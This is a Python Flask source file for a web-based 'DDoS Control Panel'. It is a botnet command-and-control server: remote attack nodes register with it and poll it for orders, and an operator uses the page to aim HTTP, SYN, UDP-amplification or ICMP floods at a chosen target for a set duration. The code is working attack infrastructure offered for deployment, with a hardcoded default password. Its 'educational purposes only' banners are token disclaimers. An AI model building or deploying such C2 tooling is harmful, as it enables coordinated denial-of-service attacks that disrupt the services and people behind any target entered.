#!/usr/bin/env python3
"""
DDoS Control Panel - Web UI
Deploy on Render.com for 24/7 access
"""
from flask import Flask, render_template_string, request, jsonify
from flask_cors import CORS
import threading
import hashlib
import time
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

class AttackController:
    def __init__(self):
        self.password = hashlib.sha256(os.environ.get('ADMIN_PASSWORD', 'admin123').encode()).hexdigest()
        self.nodes = {}
        self.active_attack = None
        self.attack_history = []
        self.lock = threading.Lock()
        
        # Cleanup thread
        threading.Thread(target=self._cleanup_nodes, daemon=True).start()
    
    def _cleanup_nodes(self):
        """Remove inactive nodes"""
        while True:
            time.sleep(30)
            current = time.time()
            with self.lock:
                dead = [nid for nid, n in self.nodes.items() if current - n['last_seen'] > 60]
                for nid in dead:
                    del self.nodes[nid]
    
    def authenticate(self, pwd):
        return hashlib.sha256(pwd.encode()).hexdigest() == self.password
    
    def register_node(self, node_id, info):
        with self.lock:
            self.nodes[node_id] = {
                'info': info,
                'last_seen': time.time(),
                'connected': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'idle'
            }
    
    def update_heartbeat(self, node_id):
        with self.lock:
            if node_id in self.nodes:
                self.nodes[node_id]['last_seen'] = time.time()
    
    def start_attack(self, target, method, threads, duration):
        if self.active_attack:
            return {'success': False, 'error': 'Attack in progress'}
        
        attack = {
            'target': target,
            'method': method,
            'threads': threads,
            'duration': duration,
            'started': time.time(),
            'nodes': len(self.nodes)
        }
        
        self.active_attack = attack
        return {'success': True, 'attack': attack}
    
    def stop_attack(self):
        if not self.active_attack:
            return {'success': False, 'error': 'No active attack'}
        
        self.active_attack = None
        return {'success': True}
    
    def get_stats(self):
        with self.lock:
            return {
                'nodes': len(self.nodes),
                'active': self.active_attack is not None,
                'attack': self.active_attack
            }

controller = AttackController()

# HTML Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>⚡ DDoS Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            background: rgba(0, 255, 0, 0.05);
        }
        
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .header p {
            color: #ff0000;
            font-size: 0.9em;
            margin-top: 10px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #00ff00;
        }
        
        .stat-label {
            font-size: 0.8em;
            color: #00ff00;
            opacity: 0.7;
            margin-top: 5px;
        }
        
        .control-panel {
            background: rgba(0, 255, 0, 0.05);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #00ff00;
            font-weight: bold;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            background: #000000;
            border: 1px solid #00ff00;
            border-radius: 5px;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        
        .method-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }
        
        .method-btn {
            padding: 15px;
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            border-radius: 5px;
            color: #00ff00;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .method-btn:hover {
            background: rgba(0, 255, 0, 0.2);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.3);
        }
        
        .method-btn.active {
            background: #00ff00;
            color: #000000;
        }
        
        .button-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 25px;
        }
        
        .btn {
            padding: 15px;
            border: none;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
        }
        
        .btn-start {
            background: #00ff00;
            color: #000000;
        }
        
        .btn-start:hover {
            background: #00cc00;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.5);
        }
        
        .btn-stop {
            background: #ff0000;
            color: #ffffff;
        }
        
        .btn-stop:hover {
            background: #cc0000;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .status-panel {
            background: rgba(0, 255, 0, 0.05);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .status-title {
            font-size: 1.2em;
            margin-bottom: 15px;
            color: #00ff00;
        }
        
        .status-item {
            padding: 10px;
            margin-bottom: 10px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            border-left: 3px solid #00ff00;
        }
        
        .attacking {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .info-box {
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid #ffff00;
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
            color: #ffff00;
        }
        
        .warning {
            background: rgba(255, 0, 0, 0.1);
            border-color: #ff0000;
            color: #ff0000;
        }
        
        @media (max-width: 600px) {
            .method-grid {
                grid-template-columns: 1fr;
            }
            
            .button-group {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ DDoS CONTROL PANEL ⚡</h1>
            <p>🚨 FOR EDUCATIONAL PURPOSES ONLY 🚨</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="nodeCount">0</div>
                <div class="stat-label">ACTIVE NODES</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="attackStatus">IDLE</div>
                <div class="stat-label">STATUS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalPower">0</div>
                <div class="stat-label">TOTAL THREADS</div>
            </div>
        </div>
        
        <div class="control-panel">
            <h2 style="margin-bottom: 20px; color: #00ff00;">⚙️ ATTACK CONFIGURATION</h2>
            
            <div class="form-group">
                <label>🎯 TARGET URL/IP</label>
                <input type="text" id="target" placeholder="https://example.com or 192.168.1.1:80">
            </div>
            
            <div class="form-group">
                <label>⚔️ ATTACK METHOD</label>
                <div class="method-grid">
                    <div class="method-btn active" data-method="http">
                        <div>HTTP</div>
                        <small>Layer 7 Flood</small>
                    </div>
                    <div class="method-btn" data-method="tcp">
                        <div>TCP</div>
                        <small>SYN Flood</small>
                    </div>
                    <div class="method-btn" data-method="udp">
                        <div>UDP</div>
                        <small>Amplification</small>
                    </div>
                    <div class="method-btn" data-method="icmp">
                        <div>ICMP</div>
                        <small>Ping Flood</small>
                    </div>
                </div>
            </div>
            
            <div class="form-group">
                <label>🔥 THREADS (per node)</label>
                <input type="number" id="threads" value="80" min="1" max="500">
            </div>
            
            <div class="form-group">
                <label>⏱️ DURATION (seconds)</label>
                <input type="number" id="duration" value="60" min="1" max="3600">
            </div>
            
            <div class="button-group">
                <button class="btn btn-start" onclick="startAttack()">🚀 START ATTACK</button>
                <button class="btn btn-stop" onclick="stopAttack()">🛑 STOP ATTACK</button>
            </div>
        </div>
        
        <div class="status-panel">
            <div class="status-title">📊 SYSTEM STATUS</div>
            <div id="statusMessages"></div>
        </div>
        
        <div class="info-box warning">
            <strong>⚠️ LEGAL WARNING</strong><br>
            DDoS attacks are ILLEGAL. Using this tool against systems you don't own is a FEDERAL CRIME.
            This is for EDUCATIONAL and TESTING purposes only on YOUR OWN systems with permission.
        </div>
    </div>

    <script>
        let selectedMethod = 'http';
        
        // Method selection
        document.querySelectorAll('.method-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                selectedMethod = this.dataset.method;
            });
        });
        
        // Update stats
        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('nodeCount').textContent = data.nodes;
                    document.getElementById('attackStatus').textContent = data.active ? 'ATTACKING' : 'IDLE';
                    
                    const threads = parseInt(document.getElementById('threads').value) || 80;
                    document.getElementById('totalPower').textContent = data.nodes * threads;
                    
                    if (data.active && data.attack) {
                        showStatus(`🎯 Target: ${data.attack.target}`, 'attacking');
                        showStatus(`⚔️ Method: ${data.attack.method.toUpperCase()}`, 'attacking');
                        showStatus(`🔥 Total Power: ${data.attack.nodes * data.attack.threads} threads`, 'attacking');
                    }
                })
                .catch(err => console.error('Stats error:', err));
        }
        
        // Start attack
        function startAttack() {
            const target = document.getElementById('target').value;
            const threads = parseInt(document.getElementById('threads').value) || 80;
            const duration = parseInt(document.getElementById('duration').value) || 60;
            
            if (!target) {
                alert('❌ Please enter a target!');
                return;
            }
            
            if (!confirm(`⚠️ Launch attack on ${target}?\\n\\nThis is ILLEGAL if you don't own the target!`)) {
                return;
            }
            
            fetch('/api/attack/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    password: 'admin123',
                    target: target,
                    method: selectedMethod,
                    threads: threads,
                    duration: duration
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showStatus('✅ ATTACK LAUNCHED!', 'success');
                    showStatus(`🎯 ${data.attack.nodes} nodes deployed`, 'success');
                } else {
                    showStatus('❌ ' + data.error, 'error');
                }
            })
            .catch(err => showStatus('❌ Request failed', 'error'));
        }
        
        // Stop attack
        function stopAttack() {
            fetch('/api/attack/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: 'admin123'})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showStatus('🛑 ATTACK STOPPED', 'success');
                } else {
                    showStatus('❌ ' + data.error, 'error');
                }
            })
            .catch(err => showStatus('❌ Request failed', 'error'));
        }
        
        // Show status message
        function showStatus(message, type = 'info') {
            const container = document.getElementById('statusMessages');
            const item = document.createElement('div');
            item.className = 'status-item ' + type;
            item.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            container.insertBefore(item, container.firstChild);
            
            // Keep only last 10 messages
            while (container.children.length > 10) {
                container.removeChild(container.lastChild);
            }
        }
        
        // Auto-update every 2 seconds
        setInterval(updateStats, 2000);
        updateStats();
        
        // Initial message
        showStatus('🟢 Control panel online', 'success');
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        node_id = request.remote_addr
        controller.register_node(node_id, data.get('info', {}))
        return jsonify({'success': True, 'node_id': node_id})
    except:
        return jsonify({'success': False}), 400

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json()
        controller.update_heartbeat(data.get('node_id'))
        return jsonify({'success': True})
    except:
        return jsonify({'success': False}), 400

@app.route('/api/command', methods=['GET'])
def command():
    try:
        node_id = request.args.get('node_id')
        controller.update_heartbeat(node_id)
        
        if controller.active_attack:
            elapsed = time.time() - controller.active_attack['started']
            if elapsed < controller.active_attack['duration']:
                return jsonify({
                    'success': True,
                    'command': 'attack',
                    'data': controller.active_attack
                })
            else:
                controller.active_attack = None
        
        return jsonify({'success': True, 'command': 'idle'})
    except:
        return jsonify({'success': False}), 400

@app.route('/api/stats')
def stats():
    return jsonify(controller.get_stats())

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    try:
        data = request.get_json()
        
        if not controller.authenticate(data.get('password', '')):
            return jsonify({'success': False, 'error': 'Auth failed'}), 401
        
        result = controller.start_attack(
            data.get('target'),
            data.get('method', 'http'),
            data.get('threads', 80),
            data.get('duration', 60)
        )
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    try:
        data = request.get_json()
        
        if not controller.authenticate(data.get('password', '')):
            return jsonify({'success': False, 'error': 'Auth failed'}), 401
        
        result = controller.stop_attack()
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
\033[38;5;46m
    ██████╗ ██████╗  ██████╗ ███████╗    ██████╗  █████╗ ███╗   ██╗███████╗██╗     
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║     
    ██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝███████║██╔██╗ ██║█████╗  ██║     
    ██║  ██║██║  ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║     
    ██████╔╝██████╔╝╚██████╔╝███████║    ██║     ██║  ██║██║ ╚████║███████╗███████╗
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
                                                                                      
                          [WEB CONTROL PANEL]
                     [Deploy on Render.com - 24/7]
\033[0m
    🌐 Starting server on port {port}
    🔐 Password: admin123
    📡 Ready to coordinate attacks
    """)
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
